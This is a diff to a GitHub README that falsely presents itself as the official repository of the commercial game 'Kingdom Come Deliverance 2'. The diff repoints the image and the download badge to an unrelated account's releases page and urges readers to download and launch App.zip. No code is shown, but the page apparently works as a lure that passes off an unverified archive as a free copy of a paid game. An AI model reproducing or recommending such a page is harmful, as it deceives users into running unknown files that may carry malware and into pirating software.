@@ -11,12 +11,12 @@ Welcome to the official repository for "Kingdom Come Deliverance 2" - a thrillin
 ## Introduction
 "Kingdom Come Deliverance 2" is the highly anticipated sequel to the critically acclaimed RPG, offering players an even deeper dive into historical accuracy and immersive storytelling. Set against the backdrop of a turbulent Medieval Europe, players will navigate political intrigue, engage in intense battles, and forge their destiny in a beautifully crafted world.
 
-![Kingdom Come Deliverance 2](https://yourimageurl.com)
+![Kingdom Come Deliverance 2](https://github.com/NEXOOPRO/Kingdom-Come-Deliverance-2/releases)
 
 ## Installation
 To begin your adventure in "Kingdom Come Deliverance 2", simply download the game by clicking the button below:
 
-[![Download Kingdom Come Deliverance 2](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/project/files/App.zip)
+[![Download Kingdom Come Deliverance 2](https://github.com/NEXOOPRO/Kingdom-Come-Deliverance-2/releases)](https://github.com/NEXOOPRO/Kingdom-Come-Deliverance-2/releases)
 
 Once the download is complete, launch the game and prepare to be transported to a world brimming with danger, glory, and honor.
 
